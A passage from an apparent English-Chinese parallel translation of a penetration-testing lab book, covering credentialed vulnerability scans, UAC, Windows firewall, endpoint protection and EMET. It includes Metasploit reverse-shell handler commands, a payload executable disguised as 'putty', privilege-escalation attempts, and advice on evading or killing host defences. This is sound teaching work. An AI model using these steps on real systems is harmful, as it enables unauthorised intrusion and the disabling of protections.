- en: '![Scanning with credentials](img/477-1_10_22.jpg)'
  id: totrans-80
  prefs: []
  type: TYPE_IMG
  zh: '![Scanning with credentials](img/477-1_10_22.jpg)'
- en: We have some more informational findings but still only the same two medium
    vulnerabilities, so what do we do now? We will try another scan this time, selecting
    the policy that references using credentials. Return to the scan configuration.
    When the option comes up, select the one for the credentialed scan, and let us
    see whether this provides us with more success. Unfortunately, this does not provide
    much success either. The process is to scan from the remote location and note
    the findings, and then if the scope permits, you conduct scans locally using MBSA
    or OVAL.
  id: totrans-81
  prefs: []
  type: TYPE_NORMAL
  zh: 我们有一些更多的信息发现，但仍然只有相同的两个中等漏洞，那么现在我们该怎么办呢？这次我们将尝试另一个扫描，选择引用使用凭据的策略。返回扫描配置。当选项出现时，选择有凭据的扫描，让我们看看这是否会带来更多的成功。不幸的是，这也没有带来太多的成功。这个过程是从远程位置进行扫描并记录发现，然后如果范围允许，您可以使用MBSA或OVAL在本地进行扫描。
- en: 'Before we move on, there is one important note here: the scans we have been
    attempting were all against the machine, and at that time, the machine had the
    Windows firewall on. So, this is the challenge with the internal testing; if the
    machines have the firewall on, it can make things more difficult. Let us look
    at one more scan of the Windows 7 machine with credentials and the firewall off.
    If the machine is set on **Public** when it''s connected to the network, then
    file sharing is turned off and nothing will work when we scan it with the tools.
    Therefore, we need to ensure that we can still access the file-sharing ports if
    the firewall is enabled.'
  id: totrans-82
  prefs: []
  type: TYPE_NORMAL
  zh: 在我们继续之前，这里有一个重要的说明：我们一直在尝试对这台机器进行扫描，而那时，这台机器的Windows防火墙是开启的。因此，这是内部测试的挑战；如果机器开启了防火墙，可能会使事情变得更加困难。让我们再看一下关闭防火墙的Windows
    7机器的一次扫描。如果机器在连接到网络时设置为**公共**，那么文件共享将被关闭，当我们使用工具对其进行扫描时，什么都不会起作用。因此，我们需要确保即使防火墙已启用，我们仍然可以访问文件共享端口。
- en: 'An example of the Windows 7 scan with the firewall off is shown in the following
    screenshot:'
  id: totrans-83
  prefs: []
  type: TYPE_NORMAL
  zh: 以下是关闭防火墙的Windows 7扫描的示例截图：
- en: '![Scanning with credentials](img/477-1_10_23.jpg)'
  id: totrans-84
  prefs: []
  type: TYPE_IMG
  zh: '![使用凭据进行扫描](img/477-1_10_23.jpg)'
- en: In this case, we have quite a few vulnerabilities now that we added the credentials
    to the scan policy. This is the power of vulnerability scanners; when they have
    credentials, they are much more effective.
  id: totrans-85
  prefs: []
  type: TYPE_NORMAL
  zh: 在这种情况下，我们现在有相当多的漏洞，因为我们将凭据添加到了扫描策略中。这就是漏洞扫描工具的威力所在；当它们有了凭据，它们就会更加有效。
- en: 'We will next look at a scan against a Unix machine with and without credentials,
    so we get a comparison of the different operating systems. We will use FreeBSD
    Unix, and in fact, we will use an old version of it to see what we can discover.
    The version we will use is 6.4, and at the time of writing this book, the version
    is 10.0, so there is quite a difference. An example of the FreeBSD scan without
    credentials is shown in the following screenshot:'
  id: totrans-86
  prefs: []
  type: TYPE_NORMAL
  zh: 接下来，我们将对Unix机器进行有和无凭据的扫描，以便比较不同的操作系统。我们将使用FreeBSD Unix，实际上，我们将使用一个旧版本来看看我们能发现什么。我们将使用的版本是6.4，在撰写本书时，版本是10.0，因此有相当大的差异。以下是没有凭据的FreeBSD扫描的示例截图：
- en: '![Scanning with credentials](img/477-1_10_24.jpg)'
  id: totrans-87
  prefs: []
  type: TYPE_IMG
  zh: '![使用凭据进行扫描](img/477-1_10_24.jpg)'
- en: 'As we can see from the previous screenshot, there are three low-rated vulnerabilities.
    This is a very old Unix machine, so it is hard to believe that there are only
    three vulnerabilities discovered. However, let us add some credentials and see
    whether we get any better results. With Unix and Linux, the credentials are provided
    via **Secure Shell** (**SSH**). An example of the same scan with SSH credentials
    is shown in the following screenshot:'
  id: totrans-88
  prefs: []
  type: TYPE_NORMAL
  zh: 正如我们从之前的截图中看到的，有三个低级漏洞。这是一台非常古老的Unix机器，因此很难相信只发现了三个漏洞。然而，让我们添加一些凭据，看看我们是否能得到更好的结果。对于Unix和Linux，凭据是通过**安全外壳**（**SSH**）提供的。以下是使用SSH凭据进行相同扫描的示例截图：
- en: '![Scanning with credentials](img/477-1_10_25.jpg)'
  id: totrans-89
  prefs: []
  type: TYPE_IMG
  zh: '![使用凭据进行扫描](img/477-1_10_25.jpg)'
- en: We now have 28 vulnerabilities, but more importantly, we have a critical finding
    of having an unsupported operating system. We would think that the operating system
    is unsupported as it is a very old version, but still, it is not that many vulnerabilities
    when you think about it.
  id: totrans-90
  prefs: []
  type: TYPE_NORMAL
  zh: 现在我们有28个漏洞，但更重要的是，我们发现了一个关键的问题，即操作系统不受支持。我们可能会认为操作系统不受支持是因为它是一个非常旧的版本，但是当你仔细想想，漏洞并没有那么多。
- en: 'You also might notice that the scan seems to take a long time when you try
    and scan a FreeBSD Unix machine. This is because it is a machine that knows what
    a potential scan looks like and as such, will restrict what it sends back. An
    example of this is shown in the following screenshot:'
  id: totrans-91
  prefs: []
  type: TYPE_NORMAL
  zh: 您可能还会注意到，当您尝试扫描FreeBSD Unix机器时，扫描似乎需要很长时间。这是因为这台机器知道潜在的扫描是什么样子的，因此会限制它发送的内容。以下是一个示例截图：
- en: '![Scanning with credentials](img/477-1_10_26.jpg)'
  id: totrans-92
  prefs: []
  type: TYPE_IMG
  zh: '![使用凭据进行扫描](img/477-1_10_26.jpg)'
- en: As the previous screenshot shows, the scanning tool is asking for a lot of packets,
    and the FreeBSD machine is limiting it to 200 packets per second, no matter what
    the tool tries. This, along with the fact that most vulnerability scanners put
    their main focus on Windows, is why we do not see a lot of findings with the scan.
  id: totrans-93
  prefs: []
  type: TYPE_NORMAL
  zh: 正如之前的截图所示，扫描工具正在请求大量数据包，而FreeBSD机器将其限制为每秒200个数据包，无论工具尝试什么。再加上大多数漏洞扫描工具主要关注Windows，这就是为什么我们在扫描中没有看到很多结果的原因。
- en: 'We will try one more scan as an example to see what the scanner detects when
    it encounters a Linux target. The first scan we are going to do is a scan using
    Nessus on the Kioptrix machine that we created earlier. An example of the Nessus
    network scan of the Kioptrix machine is shown in the following screenshot:'
  id: totrans-94
  prefs: []
  type: TYPE_NORMAL
  zh: 我们将尝试进行另一个扫描作为示例，看看当扫描遇到Linux目标时，扫描器会检测到什么。我们要做的第一次扫描是在之前创建的Kioptrix机器上使用Nessus进行扫描。以下是Kioptrix机器的Nessus网络扫描的示例截图：
- en: '![Scanning with credentials](img/477-1_10_27.jpg)'
  id: totrans-95
  prefs: []
  type: TYPE_IMG
  zh: '![使用凭据进行扫描](img/477-1_10_27.jpg)'
- en: Screen showing an example of the Nessus network scan of the Kioptrix machine
    (the cropped text is not important)
  id: totrans-96
  prefs: []
  type: TYPE_NORMAL
  zh: 显示了Kioptrix机器的Nessus网络扫描示例（裁剪的文本不重要）
- en: That's more like it! We can at least detect very vulnerable Linux machines.
    This is why we test on our ranges; we want to know what we can and cannot detect.
    So, based on this section, the FreeBSD Unix machine did not reveal much, but the
    Windows and the Linux machines did. This is good to know when you are testing.
    If you run into a Unix machine, you know that you can save this towards the end
    of the testing once you have completed all of the details of the other machines.
  id: totrans-97
  prefs: []
  type: TYPE_NORMAL
  zh: 这更像是！我们至少可以检测到非常容易受攻击的Linux机器。这就是为什么我们在我们的范围内进行测试；我们想知道我们能够检测到什么，以及不能检测到什么。因此，根据本节，FreeBSD
    Unix机器没有显示出太多信息，但Windows和Linux机器显示了。在测试时了解这一点是很重要的。如果你遇到了Unix机器，你会知道你可以将它保存到测试的最后，一旦你完成了其他机器的所有细节。
- en: Dealing with host protection
  id: totrans-98
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 处理主机保护
- en: We know there is more than likely going to be host protection that we may have
    to encounter; therefore, in our pen testing labs, we want to test the different
    host protection to see what we can and cannot do. This is an area that again is
    going to depend on the administrator and the team that we are up against. A hardened
    machine with very little services running on it will present a challenge to our
    testing.
  id: totrans-99
  prefs: []
  type: TYPE_NORMAL
  zh: 我们知道很可能会遇到主机保护，因此在我们的渗透测试实验室中，我们想测试不同的主机保护，看看我们能做什么，不能做什么。这是一个取决于管理员和我们所面对的团队的领域。一个硬化的机器上几乎没有运行的服务将对我们的测试构成挑战。
- en: User Account Control
  id: totrans-100
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 用户账户控制
- en: One of the most common things we are going to encounter is **User Account Control**
    (**UAC**); this is because it is on by default and is rarely changed when a site
    installs Windows. One good thing about UAC is the fact that the users are conditioned
    to click. So, if something pops up saying it needs permission, the user more than
    likely will click on it. We can use this to our advantage, but there always is
    a chance that the user might not click. So, for these situations, we rely on some
    form of UAC bypass to get us past the UAC protections.
  id: totrans-101
  prefs: []
  type: TYPE_NORMAL
  zh: 我们将遇到的最常见的事情之一是**用户账户控制**（**UAC**）；这是因为它默认情况下是开启的，并且在安装Windows时很少更改。关于UAC和绕过它的方法，一个好的方面是用户习惯于点击。因此，如果弹出窗口说需要权限，用户很可能会点击。我们可以利用这一点，但总有可能用户不会点击。因此，在这些情况下，我们依赖某种形式的UAC绕过来帮助我们绕过UAC保护。
- en: Within the metasploit framework, there is a UAC bypass, and it is a function
    that is located in the Meterpreter shell. For reference on UAC and ways to bypass
    it, refer to [http://journeyintoir.blogspot.com/2013/03/uac-impact-on-malware.html](http://journeyintoir.blogspot.com/2013/03/uac-impact-on-malware.html).
  id: totrans-102
  prefs: []
  type: TYPE_NORMAL
  zh: 在metasploit框架中，有一个UAC绕过，它是位于Meterpreter shell中的一个功能。有关UAC和绕过它的方法，请参考[http://journeyintoir.blogspot.com/2013/03/uac-impact-on-malware.html](http://journeyintoir.blogspot.com/2013/03/uac-impact-on-malware.html)。
- en: For the most part, to exploit the Windows 7 machine, we will need to get some
    form of a client-side attack. We will discuss these attacks later in the book.
    For now, we will use the simple method of creating an executable and then getting
    it to the victim machine. This, when executed, will provide us with a shell into
    the Windows 7 machine. Once we have the shell, then it is just a matter of working
    through the different processes to attempt to bypass UAC and achieve system level
    privileges on the machine.
  id: totrans-103
  prefs: []
  type: TYPE_NORMAL
  zh: 在很大程度上，要利用Windows 7机器，我们需要获得某种客户端攻击。我们将在本书的后面讨论这些攻击。现在，我们将使用创建可执行文件的简单方法，然后将其传输到受害者机器。执行时，这将为我们提供对Windows
    7机器的shell。一旦我们有了shell，那么只是通过不同的进程来尝试绕过UAC并在机器上实现系统级别特权的问题。
- en: 'The first thing we want to do is verify that the UAC settings are enabled on
    the machine. You can find the settings by navigating to **Control Panel** | **Action
    Center** | **Change User Account Control Settings**. This will open the settings
    of UAC. An example is shown in the following screenshot:'
  id: totrans-104
  prefs: []
  type: TYPE_NORMAL
  zh: 我们要做的第一件事是验证机器上是否启用了UAC设置。您可以通过导航到**控制面板** | **操作中心** | **更改用户账户控制设置**来找到设置。这将打开UAC的设置。以下是示例：
- en: '![User Account Control](img/477-1_10_37.jpg)'
  id: totrans-105
  prefs: []
  type: TYPE_IMG
  zh: '![用户账户控制](img/477-1_10_37.jpg)'
- en: We will create an executable file and transfer it to the Windows 7 virtual machine
    to provide us our first shell from the exploited machine. We will use the executable
    file capability of metasploit.
  id: totrans-106
  prefs: []
  type: TYPE_NORMAL
  zh: 我们将创建一个可执行文件，并将其传输到Windows 7虚拟机，以便从被攻击的机器中获得我们的第一个shell。我们将使用metasploit的可执行文件功能。
- en: 'We first need to create an executable file to use as our connection from the
    Windows 7 machine back to our Kali Linux machine. We have this capability in the
    metasploit tool. In your Kali Linux machine, open a terminal window and enter
    `msfconsole` to open the metasploit tool. Once the metasploit tool comes up (it
    will take a minute), enter the following command:'
  id: totrans-107
  prefs: []
  type: TYPE_NORMAL
  zh: 我们首先需要创建一个可执行文件，用作从Windows 7机器返回到我们的Kali Linux机器的连接。我们在metasploit工具中具有这种能力。在您的Kali
    Linux机器上，打开一个终端窗口，并输入`msfconsole`来打开metasploit工具。一旦metasploit工具启动（这将需要一分钟），输入以下命令：
- en: '[PRE1]'
  id: totrans-108
  prefs: []
  type: TYPE_PRE
  zh: '[PRE1]'
- en: This will create the executable file called `putty`, which contains the payload
    and connection information for the connection to egress out from the network to
    the Kali machine.
  id: totrans-109
  prefs: []
  type: TYPE_NORMAL
  zh: 这将创建一个名为`putty`的可执行文件，其中包含用于从网络到Kali机器的连接的有效载荷和连接信息。
- en: 'An example of the command being entered and completed is shown in the following
    screenshot:'
  id: totrans-110
  prefs: []
  type: TYPE_NORMAL
  zh: 以下是输入和完成命令的示例：
- en: '![User Account Control](img/477-1_10_38.jpg)'
  id: totrans-111
  prefs: []
  type: TYPE_IMG
  zh: '![用户账户控制](img/477-1_10_38.jpg)'
- en: Screen showing an example of the command being entered and completed (the cropped
    text is not important)
  id: totrans-112
  prefs: []
  type: TYPE_NORMAL
  zh: 屏幕显示输入和完成命令的示例（裁剪的文本不重要）
- en: We have now created the file and need to get it from our machine to the victim.
    We could use some form of social engineering; however, for our purposes, in a
    lab environment, we will just drag-and-drop the file into the victim machine.
  id: totrans-113
  prefs: []
  type: TYPE_NORMAL
  zh: 我们现在已经创建了文件，并需要将其从我们的机器传输到受害者。我们可以使用某种形式的社会工程学；但是，对于我们的目的，在实验环境中，我们将文件拖放到受害者机器中。
- en: 'The next thing we need to do is to set up the metasploit tool; we do this by
    entering the following commands:'
  id: totrans-114
  prefs: []
  type: TYPE_NORMAL
  zh: 接下来我们需要做的是设置metasploit工具；我们通过输入以下命令来实现这一点：
- en: '`use exploit/multi/handler`'
  id: totrans-115
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`use exploit/multi/handler`'
- en: '`set PAYLOAD windows/meterpreter/reverse_tcp`'
  id: totrans-116
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`set PAYLOAD windows/meterpreter/reverse_tcp`'
- en: '`set LHOST <Kali IP>`'
  id: totrans-117
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`set LHOST <Kali IP>`'
- en: '`set LPORT 123`'
  id: totrans-118
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`set LPORT 123`'
- en: '`exploit`'
  id: totrans-119
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`exploit`'
- en: 'This sets the listener and it waits for a victim to connect to it. An example
    of the commands is shown in the following screenshot:'
  id: totrans-120
  prefs: []
  type: TYPE_NORMAL
  zh: 这将设置监听器，并等待受害者连接。以下是命令的示例：
- en: '![User Account Control](img/477-1_10_39.jpg)'
  id: totrans-121
  prefs: []
  type: TYPE_IMG
  zh: '![用户账户控制](img/477-1_10_39.jpg)'
- en: 'We are now ready for the connection. For this, we would need the user to run
    the executable we have created. We could use an encoder such as `msfencode` to
    try and evade the host-based protections that are in place. However, in a test
    environment, we can only validate the evasion works against our configuration,
    and there is no guarantee that we will get the same configuration in our target
    environment. When the program is run, we should see a connection and session open
    in our Kali window. An example of this is shown in the following screenshot:'
  id: totrans-122
  prefs: []
  type: TYPE_NORMAL
  zh: 现在我们已经准备好连接了。为此，我们需要用户运行我们创建的可执行文件。我们可以使用诸如`msfencode`之类的编码器来尝试规避已经存在的基于主机的保护措施。然而，在测试环境中，我们只能验证规避是否适用于我们的配置，并不能保证我们在目标环境中会得到相同的配置。当程序运行时，我们应该在我们的Kali窗口中看到一个连接和会话打开。以下截图显示了一个示例：
- en: '![User Account Control](img/477-1_10_40.jpg)'
  id: totrans-123
  prefs: []
  type: TYPE_IMG
  zh: 用户账户控制
- en: 'We now have a shell. So here comes the tricky part; we have to try and escalate
    the privileges, but first we need to see what privilege level we are at. Enter
    `getuid` in your shell on the victim machine to display your current privilege
    level. An example of this is shown in the following screenshot:'
  id: totrans-124
  prefs: []
  type: TYPE_NORMAL
  zh: 现在我们有了一个shell。接下来就是棘手的部分；我们必须尝试提升权限，但首先我们需要看看我们目前的权限级别是什么。在受害机器上的shell中输入`getuid`来显示您当前的权限级别。以下截图显示了一个示例：
- en: '![User Account Control](img/477-1_10_41.jpg)'
  id: totrans-125
  prefs: []
  type: TYPE_IMG
  zh: 用户账户控制
- en: 'As the previous screenshot shows, we are not the system, so we need to escalate
    privileges and bypass the UAC protection. The first thing to try is to see whether
    the Meterpreter shell can perform privilege escalation for us. We do this by entering
    `getsystem` and letting it try to escalate privileges to the system. An example
    of this is shown in the following screenshot:'
  id: totrans-126
  prefs: []
  type: TYPE_NORMAL
  zh: 正如前面的截图所示，我们不是系统，所以我们需要提升权限并绕过UAC保护。首先要尝试的是看看Meterpreter shell是否能为我们执行特权升级。我们可以通过输入`getsystem`来让它尝试将权限提升到系统级别。以下截图显示了一个示例：
- en: '![User Account Control](img/477-1_10_42.jpg)'
  id: totrans-127
  prefs: []
  type: TYPE_IMG
  zh: 用户账户控制
- en: Screen showing entering getsystem and letting it try to escalate privileges
    to system (the cropped text is not important)
  id: totrans-128
  prefs: []
  type: TYPE_NORMAL
  zh: 显示输入getsystem并让其尝试将权限提升到系统（裁剪的文本不重要）
- en: As the previous screenshot shows, we are not successful, so we need to try another
    way. We will look at this in more detail when we discuss client-side testing.
    So, for now, we will stop here and look at this again later. As always, it is
    a matter of how the machine that we have compromised is configured. There is no
    guarantee that we will be able to bypass the UAC.
  id: totrans-129
  prefs: []
  type: TYPE_NORMAL
  zh: 正如前面的截图所示，我们没有成功，所以我们需要尝试另一种方法。当我们讨论客户端测试时，我们将更详细地讨论这个问题。所以，现在我们将在这里停下来，稍后再来看这个问题。一如既往，这取决于我们已经入侵的机器的配置。我们不能保证我们能够绕过UAC。
- en: The host firewall
  id: totrans-130
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 主机防火墙
- en: One of the defenses that is often overlooked is that of the host firewall. Earlier
    in this chapter, we explained that with the firewall on, there was a limitation
    on what we could see when we conducted a vulnerability scan. We will proceed further
    in our testing, so we can see what challenges the host firewall can present and
    then see the methods we can use to get data from the target even when the firewall
    is on.
  id: totrans-131
  prefs: []
  type: TYPE_NORMAL
  zh: 在我们的测试中，防御中经常被忽视的一点是主机防火墙。在本章的前面，我们解释了在防火墙开启时，我们在进行漏洞扫描时会受到一定的限制。我们将继续进行测试，以便了解主机防火墙可能带来的挑战，然后看看在防火墙开启时我们可以使用哪些方法来从目标获取数据。
- en: As you may recall, with our scanning methodology, we look for the live systems,
    followed by the ports, and then the services. From there, we perform enumeration,
    identify vulnerabilities, and then exploitation when it is allowed as per our
    scope of work. Well, what we need to do now is first look at this process with
    the firewall off and then with the firewall on across a sampling of the various
    defined zones. We will use the Kali Linux virtual machine and the Windows 7 machine
    as a target for our testing.
  id: totrans-132
  prefs: []
  type: TYPE_NORMAL
  zh: 正如您可能记得的，根据我们的扫描方法论，我们首先寻找活动系统，然后是端口，接着是服务。从那里，我们进行枚举，识别漏洞，然后根据我们的工作范围进行利用。现在，我们需要做的是首先关闭防火墙，然后在各个定义的区域的样本上打开防火墙。我们将使用Kali
    Linux虚拟机和Windows 7机器作为我们测试的目标。
- en: 'In your Windows 7 machine, we need to open the firewall configuration. There
    are a number of ways to do this. For our purpose, here we will right-click on
    the network tray icon and navigate to **Open Network and Sharing Center** | **Windows
    Firewall** to open the firewall configuration options. An example of this is shown
    in the following screenshot:'
  id: totrans-133
  prefs: []
  type: TYPE_NORMAL
  zh: 在您的Windows 7机器上，我们需要打开防火墙配置。有许多方法可以做到这一点。为了我们的目的，在这里我们将右键单击网络托盘图标，然后导航到**打开网络和共享中心**
    | **Windows防火墙**以打开防火墙配置选项。以下截图显示了一个示例：
- en: '![The host firewall](img/477-1_10_28.jpg)'
  id: totrans-134
  prefs: []
  type: TYPE_IMG
  zh: '![主机防火墙](img/477-1_10_28.jpg)'
- en: As the previous screenshot shows, we have the firewall on, but it is on only
    on the **Home or work (private) networks** settings. This is probably not what
    we will encounter in an environment; the **Public networks** settings would more
    than likely be in the on state, but for our testing, this will serve the purpose.
    So, the question is what do the different zones mean with respect to the settings
    for the firewall with the most recent versions of Windows not as much as with
    a Windows Server 2003 for instance?
  id: totrans-135
  prefs: []
  type: TYPE_NORMAL
  zh: 正如前面的截图所示，我们的防火墙是开启的，但只在**家庭或工作（私人）网络**设置上开启。这可能不是我们在实际环境中会遇到的情况；**公共网络**设置更有可能是开启状态，但对于我们的测试来说，这已经足够了。所以，问题是，对于最新版本的Windows来说，不同的区域对于防火墙设置意味着什么，与例如Windows
    Server 2003相比并不那么重要？
- en: 'The latest releases of Windows know that if the role of the machine is that
    of a client, then it should not be receiving any connections. So, how do we view
    the connection settings? Open an administrator command prompt in the Windows 7
    machine and enter the following command on the command line:'
  id: totrans-136
  prefs: []
  type: TYPE_NORMAL
  zh: 最新版本的Windows知道，如果机器的角色是客户端，那么它不应该接收任何连接。那么，我们如何查看连接设置呢？在Windows 7机器上以管理员命令提示符打开，并在命令行上输入以下命令：
- en: '[PRE2]'
  id: totrans-137
  prefs: []
  type: TYPE_PRE
  zh: '[PRE2]'
- en: 'An example of the command is shown in the following screenshot:'
  id: totrans-138
  prefs: []
  type: TYPE_NORMAL
  zh: 命令的示例如下截图所示：
- en: '![The host firewall](img/477-1_10_29.jpg)'
  id: totrans-139
  prefs: []
  type: TYPE_IMG
  zh: '![主机防火墙](img/477-1_10_29.jpg)'
- en: 'As the previous screenshot shows, there is nothing open on the machine. Again,
    this is because it is a client, and by default, Windows does not let anything
    talk to the client. This can be discovered by looking at the recommended settings
    on the Windows machine. An example of this is shown in the following screenshot:'
  id: totrans-140
  prefs: []
  type: TYPE_NORMAL
  zh: 正如之前的截图所示，机器上没有任何开放的东西。同样，这是因为它是一个客户端，默认情况下，Windows不允许任何东西与客户端通信。这可以通过查看Windows机器上的推荐设置来发现。这的一个示例如下截图所示：
- en: '![The host firewall](img/477-1_10_30.jpg)'
  id: totrans-141
  prefs: []
  type: TYPE_IMG
  zh: '![主机防火墙](img/477-1_10_30.jpg)'
- en: 'Now that we have a better understanding of the firewall rules on Windows, it
    is time to conduct our methodology. Using your Kali Linux machine, scan the Windows
    7 machine. You should perform the steps of the methodology and then look at the
    results with and without the firewall on. An example of the enumeration scan with
    Nmap against the machine without the firewall is shown in the following screenshot:'
  id: totrans-142
  prefs: []
  type: TYPE_NORMAL
  zh: 现在我们对Windows防火墙规则有了更好的理解，是时候进行我们的方法论了。使用你的Kali Linux机器，扫描Windows 7机器。你应该执行方法论的步骤，然后查看有无防火墙的结果。对没有防火墙的机器进行Nmap的枚举扫描的示例如下截图所示：
- en: '![The host firewall](img/477-1_10_31.jpg)'
  id: totrans-143
  prefs: []
  type: TYPE_IMG
  zh: '![主机防火墙](img/477-1_10_31.jpg)'
- en: 'Now that we have a result that shows us quite a bit of information about our
    target, we will turn the firewall on and see whether the Nmap tool or moreover,
    the Nmap scripting engine, detects anything from the firewall-protected target.
    You can use the command line to enable the firewall. In the command prompt window,
    enter `netsh firewall set opmode enable` to enable the firewall. An example of
    the results when we scan against a firewall-protected machine is shown in the
    following screenshot:'
  id: totrans-144
  prefs: []
  type: TYPE_NORMAL
  zh: 现在我们有了一个显示关于我们目标的大量信息的结果，我们将打开防火墙，看看Nmap工具或者更确切地说，Nmap脚本引擎是否能检测到来自受防火墙保护目标的任何东西。你可以使用命令行来启用防火墙。在命令提示符窗口中，输入`netsh
    firewall set opmode enable`来启用防火墙。针对受防火墙保护的机器进行扫描的结果示例如下截图所示：
- en: '![The host firewall](img/477-1_10_32.jpg)'
  id: totrans-145
  prefs: []
  type: TYPE_IMG
  zh: '![主机防火墙](img/477-1_10_32.jpg)'
- en: 'As the previous screenshot shows, the firewall can present challenges for our
    testing. The fact that with Windows 7, by default, there really is nothing allowed
    inbound shows the changes in the philosophy with respect to security. The good
    news is that something will require access, and as such, the administrator will
    turn something on or allow some program access. To view the allowed programs from
    the command line, enter the following command:'
  id: totrans-146
  prefs: []
  type: TYPE_NORMAL
  zh: 正如之前的截图所示，防火墙可能会给我们的测试带来挑战。事实上，对于Windows 7，默认情况下，真的没有任何入站允许的东西，这显示了安全哲学的变化。好消息是，某些东西将需要访问，因此管理员会打开某些东西或允许某些程序访问。要查看命令行中允许的程序，输入以下命令：
- en: '[PRE3]'
  id: totrans-147
  prefs: []
  type: TYPE_PRE
  zh: '[PRE3]'
- en: 'We have looked at the Windows 7 firewall, and this is a representation of a
    client, but what about a server? We will look at a Windows 2003 server for comparison.
    The commands in Windows Server 2003 are the same. If the server is set as a standalone
    one, then you will see similar results to what we discovered earlier. However,
    it would not be common to see the server without some form of services, and the
    most common one is the file-sharing service that many servers allow for the sharing
    of information. An example of Windows Server 2003 that has file sharing enabled
    is shown in the following screenshot:'
  id: totrans-148
  prefs: []
  type: TYPE_NORMAL
  zh: 我们已经看过了Windows 7防火墙，这是客户端的一个表示，但服务器呢？我们将以Windows 2003服务器进行比较。Windows Server
    2003中的命令是相同的。如果服务器设置为独立服务器，那么你将看到与我们之前发现的类似的结果。然而，很少见到没有某种形式服务的服务器，最常见的是文件共享服务，许多服务器允许共享信息。启用文件共享的Windows
    Server 2003的示例如下截图所示：
- en: '![The host firewall](img/477-1_10_33.jpg)'
  id: totrans-149
  prefs: []
  type: TYPE_IMG
  zh: '![主机防火墙](img/477-1_10_33.jpg)'
- en: We have now looked at the protections that are in place if a site uses the built-in
    firewall of Windows, and as we have discovered, this can and will present challenges
    in testing.
  id: totrans-150
  prefs: []
  type: TYPE_NORMAL
  zh: 现在我们已经看过了如果一个站点使用Windows的内置防火墙所采取的保护措施，正如我们发现的那样，这可能会在测试中提出挑战。
- en: Endpoint protection
  id: totrans-151
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 端点保护
- en: The next type of protection we want to look at is the protection of the endpoint.
    We saw an example of this earlier, so we will only briefly cover the topic here.
    The important thing to remember is all of these protections usually have something
    that has to be allowed through, and in testing, it is our task to try and discover
    this and reveal the weakness. We looked at the Symantec tool and discovered that
    if we use a standard payload that has a signature on it, then we more than likely
    will get detected. If we do get a shell on a protected machine, then it is just
    a matter of identifying the service and then terminating it. This can all be done
    using the metasploit tool as long as we select Meterpreter as the payload.
  id: totrans-152
  prefs: []
  type: TYPE_NORMAL
  zh: 我们要看的下一个保护类型是端点保护。我们之前看过一个例子，所以这里我们只会简要介绍一下这个主题。要记住的重要事情是所有这些保护通常都有一些必须允许通过的东西，在测试中，我们的任务是尝试发现这一点并揭示弱点。我们看了Symantec工具，并发现如果我们使用一个带有签名的标准有效负载，那么很可能会被检测到。如果我们在受保护的机器上获得了shell，那么只需要识别服务然后终止它。只要我们选择Meterpreter作为有效负载，这一切都可以使用metasploit工具完成。
- en: Enhanced Mitigation Experience Toolkit
  id: totrans-153
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 增强的缓解体验工具
- en: At the time of writing this book, the Enhanced Mitigation Experience Toolkit
    (EMET) tool provided from Microsoft is probably one of the toughest tools you
    might encounter on the machine. The deployment of this protection is still in
    its infancy, but if you do run across it in your testing, it can be quite challenging
    to get around. It is one of the reasons that Microsoft started supporting the
    "Bugs for Bounty" concept where they will pay for the bugs that are discovered
    in their software in their latest operating systems.
  id: totrans-154
  prefs: []
  type: TYPE_NORMAL
  zh: 在撰写本书时，微软提供的增强缓解体验工具（EMET）工具可能是您在机器上遇到的最棘手的工具之一。这种保护的部署仍处于起步阶段，但如果您在测试中遇到它，可能会非常具有挑战性。这也是微软开始支持“漏洞赏金”概念的原因，他们将支付在其最新操作系统中发现的软件漏洞。
- en: At the time of writing this book, the current version of EMET is 4.0\. If you
    run into an EMET-protected machine, you will have to come up with custom payloads
    as well as other methods to try and bypass it, but good luck! As the iterations
    of EMET continue to mature, it will be more and more difficult to get by it. The
    goal would be to stop the EMET process once the access has been gained and then
    carry out the attack; otherwise, use custom payloads and hope that you can bypass
    the EMET protection.
  id: totrans-155
  prefs: []
  type: TYPE_NORMAL
  zh: 在撰写本书时，EMET的当前版本是4.0。如果您遇到受EMET保护的机器，您将不得不想出自定义有效载荷以及其他方法来尝试绕过它，但祝您好运！随着EMET的迭代不断成熟，要绕过它将变得越来越困难。目标是在获得访问权限后停止EMET进程，然后进行攻击；否则，使用自定义有效载荷，并希望您可以绕过EMET保护。
- en: 'An example of the EMET configuration on my laptop is shown in the following
    screenshot:'
  id: totrans-156
  prefs: []
  type: TYPE_NORMAL
  zh: 以下是我笔记本电脑上EMET配置的一个示例：
- en: '![Enhanced Mitigation Experience Toolkit](img/477-1_10_34.jpg)'
  id: totrans-157
  prefs: []
  type: TYPE_IMG
  zh: '![增强缓解体验工具](img/477-1_10_34.jpg)'
- en: As the previous screenshot shows, in this configuration, there are three applications
    that have been added to the EMET tool. These applications will be operating in
    a shimmed environment to prevent them from being compromised. The EMET tool also
    has a number of applications already set for monitoring.
  id: totrans-158
  prefs: []
  type: TYPE_NORMAL
  zh: 正如前面的截图所示，在这个配置中，已经有三个应用程序被添加到EMET工具中。这些应用程序将在一个shimmed环境中运行，以防止它们被 compromise。EMET工具还有许多已经设置好的应用程序进行监控。
- en: 'An example of some of these is shown in the following screenshot:'
  id: totrans-159
  prefs: []
  type: TYPE_NORMAL
  zh: 以下是一些示例，显示了其中一些：
- en: '![Enhanced Mitigation Experience Toolkit](img/477-1_10_35.jpg)'
  id: totrans-160
  prefs: []
  type: TYPE_IMG
  zh: '![增强缓解体验工具](img/477-1_10_35.jpg)'
- en: 'You can also add applications that need to be protected by the EMET tool. To
    see which applications have been added by the user, you can type the following
    in the command prompt window:'
  id: totrans-161
  prefs: []
  type: TYPE_NORMAL
  zh: 您还可以添加需要受EMET工具保护的应用程序。要查看用户添加了哪些应用程序，您可以在命令提示符窗口中输入以下内容：
- en: '[PRE4]'
  id: totrans-162
  prefs: []
  type: TYPE_PRE
  zh: '[PRE4]'
- en: 'This command will show the applications that have been added and are currently
    being protected by the EMET tool. An example of this is shown in the following
    screenshot:'
  id: totrans-163
